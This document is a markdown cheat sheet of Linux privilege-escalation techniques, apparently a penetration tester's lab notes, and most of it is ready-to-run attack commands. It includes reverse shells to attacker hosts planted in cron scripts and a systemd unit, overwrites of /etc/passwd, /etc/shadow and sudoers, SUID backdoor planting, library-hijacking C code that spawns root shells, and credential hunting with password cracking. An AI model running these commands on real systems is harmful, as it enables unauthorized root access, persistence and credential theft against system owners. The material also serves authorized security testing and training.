# Privilege Escalation - Linux

## SSH tricks

```bash
ssh user@$RHOST # normal ssh connection

ssh user@$RHOST /bin/sh # bypass when you see a bash error at login
mv .bashrc .bashrc.bak
ssh user@$RHOST

ssh -X user@$RHOST # X forwarding when you need a GUI interaction 
```

## Preparation 
```bash
alias ll='clear; ls -lsaht --color=auto'
# Restricted shell bypass
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games 

---- standard interactive shell environment ---- 
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash') #ishell bypass
/bin/sh -I
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'

export TERM=xterm-256color
ctrl-z 
echo $TERM; 
stty -a # Notice number of rows and columns
stty raw -echo; fg; reset 
stty rows xx
stty columns yy

---- socat based interactive shell environment ----
# Kali
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target Machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## Automated local enumeration 
```bash
/linpeas.sh -q
./linenum.sh
./lse.sh -l 1 # or 2
./

``` 

## General information and quick wins 
```bash
id
last -a
hostname

# Check distributions
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release 
lsb_release -a 

# Check 64 bits
cat /proc/version
uname -a
uname -mrs 

# Check environment variables
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env

# List all users
cat /etc/passwd
cut -d: -f1 /etc/passwd

# Find specific users and groups
id <user name>
groups <user name>
getent passwd offsec

# Find my file access
for i in $(groups); do echo "=======$i======"; find / -group $i 2>/dev/null | grep -v "proc" >> allfiles; done 

# Quick wins
sudo -l 
find / -perm -u=s -type f 2>/dev/nul # SUID bits to users
find / -perm -u=g -type f 2>/dev/nul # SUID bits to groups
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 

# If sudo -l shows that current user allows to run all programs
sudo su
sudo -s
sudo -i
sudo /bin/dash
sudo /bin/bash
sudo passwd
```

## Weak File Permissions 
```bash 
# Any writeable directories
find / -writable -type d 2>/dev/null 
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

# /etc/password writeable?
openssl passwd -1 -salt iptracej 1234 # run at Kali
openssl passwd "lol" # Prints out a hash

echo "iptracej:$1$iptracej$passwd_hash:0:0:iptracej:/root:/bin/bash" > /etc/passwd
su iptracej

# Other examples
echo 'r00t:$passwd_hash:0:0:/root:/bin/bash' > /etc/passwd # Become r00t yourself with lol
echo 'kali:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > /etc/passwd # password:toor 

# /dev/sda1 readable?
debugfs /dev/sda1 # Get root's SSH private key 

# List all scheduled tasks
crontab -l
crontab -u <user name> -l 
ls -lah /etc/cron*
cat /etc/crontab

# Cron jobs file writable? 
# Insert reverse shells 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh

# Overwrite the existing shell with the following contents and wait for CRON job to run the program
  #!/bin/dash
  cp /bin/dash /tmp/backdoor
  chown root:root /tmp/backdoor
  chmod u+s /tmp/backdoor
# Execute /tmp/backdoor to get a root shell
# or 
  cp /bin/bash /tmp/backdoor
  chmod 6755 /tmp/backdoor
# Execute /tmp/backdoor -p to get a root shell

# /etc/shadow readable? 
ls -al /etc/shadow
cat /etc/shadow
find /etc -maxdepth 1 -readable -type f

# Copy /etc/passwod and /etc/shadow, and then run this command
unshadow passwd.txt shadow.txt > passwords.txt 
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

# Use Hashcat
cat /etc/shadow
See the entry such as $6$ at the beginning of the hash -> Unix type 6 password hashes -> type 6 uses SHA512 at https://www.cyberciti.biz/faq/understanding-etcshadow-file/
Check the mode at https://hashcat.net/wiki/doku.php?id=hashcat 
hashcat -m 1800 -a 0 --remove roothash.txt /usr/share/wordlists/rockyou.txt

# /etc/shadow writeable?
cat /etc/shadow
$6$ -> SHA512 
	
mkpasswd -m sha-512 1234 # Create a new password
$6$FY83eL/aEWhuy.8Q$hM/8uxJg9LFMgfNVd2PRaXVw9OpffHxpWEtu7cZn4bgmdAEb9vfpfQTLgCPGcyIQxNx3GNgV7HLR8hnDMCoFc.
	
vi /etc/shadow
Add kali:<password hash>:...  to /etc/shadow
su
password:1234

# /etc/sudoers writeable?
vi /etc/sudoers
%user ALL=(ALL) NOPASSWD:ALL #Add the line to /etc/sudoers. 
sudo su
# or
kali ALL=(ALL) NOPASSWD:ALL #Add the line to /etc/sudoers. 
sudo -i
```

## Sudo 
```bash
sudo -l 

# You see something like below
 (root) NOPASSWD: /usr/bin/find
 (root) NOPASSWD: /usr/bin/vim
 (root) NOPASSWD: /usr/bin/awk

# check https://gtfobins.github.io/ for known exploits

# Example: find
sudo find . -exec /bin/sh \; -quit

# Example: apache2 
sudo apache2 -f /etc/shadow 
$ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt 
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.t xt hash.txt 
su

# LD_Preload
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

# LD_PATH
ldd /usr/sbin/apache2 # Check library 
sudo -l # Check LD_LIBRARY_PATH enabled 
# You see like "(root) NOPASSWD: /usr/sbin/apache2" 

# Compile the following code.
  #include <stdio.h>
  #include <stdlib.h>	
  static void hijack() __attribute__((constructor));	
  void hijack() {
  		unsetenv("LD_LIBRARY_PATH");
  		setresuid(0,0,0);
  		system("/bin/bash -p");
 }
gcc -o libcrypt.so.1 -shared -fPIC library_path.c 
sudo LD_LIBRARY_PATH=./libcrypt.so.1 apache2

# CVE CVE-2019-18634
Version: Sudo 1.8.25p
https://www.exploit-db.com/exploits/47995
# CVE-2021-3156 
Version: Sudo legacy versions from 1.8.2 to 1.8.31p2, stable versions from 1.9.0 to 1.9.5p1
https://github.com/offensive-security/exploitdb/blob/master/exploits/multiple/local/49521.py 

```

## SUID 
```bash

# Enumeration 
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# Known exploits 
https://gtfobins.github.io/ 

# Example: exim
/usr/sbin/exim-4.84-3 --version
searchsploit exim 4.84
sed -i -e "s/^M//" 39535.sh
./39535.sh

# Any unknown shared object has SUID? ..so 
/usr/local/bin/suid-so # run first
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file" # trace the library calls
# If you have a your writable location where shared object is accessing such as open a file
mkdir .config # create a directory
# Compile the following program
    #include <stdio.h>
    #include <stdlib.h>	
    static void inject() __attribute__((constructor)); 
    void inject() 
    { 
        setuid(0); system("/bin/bash -p"); 
    }
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c # Compile as a shared object
/usr/local/bin/suid-so 

# Any unknown program with SUID that contains a "service" call
# Check the binary 
strings /usr/local/bin/suid-env	
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
ltrace /usr/local/bin/suid-env 2>&1 | grep service 
# Compile the following program
	int main() {
		setuid(0);
		system("/bin/bash -p");
	}
gcc -o service service.c # Compile
PATH=.:$PATH /usr/local/bin/suid-env # Run it after you place in a current directory  

# Any unknown program with SUID that contains a "service" call inside the programs (2)
# Check the binary 
strings /usr/local/bin/suid-env	
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
ltrace /usr/local/bin/suid-env 2>&1 | grep service 

bash --version # check bash version and less than4.2-048
function /usr/sbin/service { /bin/bash -p; }  # Create a function call - service
export -f /usr/sbin/service 
/usr/local/bin/suid-env2 

# Any unknown program with SUID that contains a "service" call inside the programs (3)
# Check the binary 
strings /usr/local/bin/suid-env	
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
ltrace /usr/local/bin/suid-env 2>&1 | grep service 

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2	
/tmp/rootbash -p
```

## Auto-run Serivces
```bash 
# /etc/systemd/system/yourapp.service writable with sudo permission? 
[Unit]
Description=roooooooooot
[Service]
Type=simple
User=root # Change to root 
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1' # Change to the reverse shell or whatever...
[Install]
WantedBy=multi-user.target

sudo systemctl enable yourapp
sudo service yourapp start
sudo service yourapp start
```

## NFS - No Root Squash 
```bash
# no_root_squash option?
# Target Linux 
cat /etc/exports
# You see like '/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)' 
# Kali
showmount -e $RHOST 
#Run at Kali 
mkdir /tmp/nfs
mount -o rw,vers=2 192.168.142.154:/tmp /tmp/nfs # Mount with exact IP address with showmount -e $RHOST result. 
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf 
chmod +xs /tmp/nfs/shell.elf # SUID bits
# Run at Target linux 
/tmp/shell.elf 
```

## Password hunting
```bash
./LinEnum.sh -t -k password
less .bash_history
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2>/dev/null # password, pass, creds, credentials, 

# You need to fine subdirectory under /home/ /var/ and /opt/ such as backups,demos,repository,etc.
grep pass /<login directory> /home /var/someDirectory /opt/ <other obvious directory> # do creds
grep PASS /<login directory> /home /var/ /opt/ <other obvious directory> # do CREDS
find / -name "*pass*" 2>/dev/null  # do creds
find / -name "*pass*" 2>/dev/null  -exec cp  {} /tmp/password/<directory> \; # do creds

# Find username based on password - check 5 lines before and after your password in a file
grep <your password> / -r -C 5 2>/dev/null

```

## SSH credential hunting 
```bash
# Find a PEM private key
find / -type f ! -path "/sys/*" ! -path "/proc/*"  -exec grep -l "PRIVATE KEY" {} \; 2>/dev/null 

# Check /.ssh directory permission
ls -al /.ssh/ 
# user/.ssh/id_rsa  # Typical Paths
# user/.ssh/authorized key # Typical Paths

# Check if root ssh login is permitted
grep PermitRootLogin /etc/ssh/sshd_config

# Check if SSH accepts password / key based SSH
grep 'password' /var/log/secure
grep 'password' /var/log/auth.log
grep 'password' /var/log/auth.log | tail -n 10
# Find SSH hosts
nmap -p 22 --open -sV --script sshv1.nse 10.11.1.1-254 | grep "Nmap scan report" | cut -d" " -f5 > ssh_host_list.txt 
# Copy the key and change permissions
rcp /.ssh/root_key root@192.168.142.153:/root/Downloads 
chmod 600 root_key

# SSH Permission
chmod 700 ~/.ssh
chmod 644 ~/.ssh/authorized_keys
chmod 644 ~/.ssh/known_hosts
chmod 644 ~/.ssh/config
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
```

## XLS
```bash
# TBD - Check my original notes
```
## Docker
```bash
# TBD - Check my original notes
```

## Mail
```bash
ls -al /var/spool/mail
sudo less /var/mail/$(whoami) # Read email of login users
sudo less /var/mail/username_here # Read email of another user
```

## Web directory  
```bash
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

## Quick binary analysis 
```bash
file <exe>
strings <exe> 
strace <exe>
ltrace <exe>

```
## Connection from a target through Kali to Internet
```bash
# Kali
--- change configuration ----
/etc/squid.conf
acl localnet src 192.168.128.0/24

--- restart service ----
sudo systemctl restart squid
sudo systemctl status squid

# Target Machine
--- set environment variables ----
export ftp_proxy="ftp://192.168.119.128:3128/"
export http_proxy="http://192.168.119.128:3128/"
export https_proxy="https://192.168.119.128:3128/"

--- commands ----
wget -e use_proxy=yes -e http_proxy=$http_proxy http://somewhere
curl --proxy $http_proxy "http://httpbin.org/ip"

--- apt install ----
Acquire::ftp::proxy "ftp://192.168.119.128:3128/";
Acquire::http::proxy "http://192.168.119.128:3128/"; 
Acquire::https::proxy "https://192.168.119.128:3128/";

--- unset environment variables ----
unset ftp_proxy
unset http_proxy
unset https_proxy

```

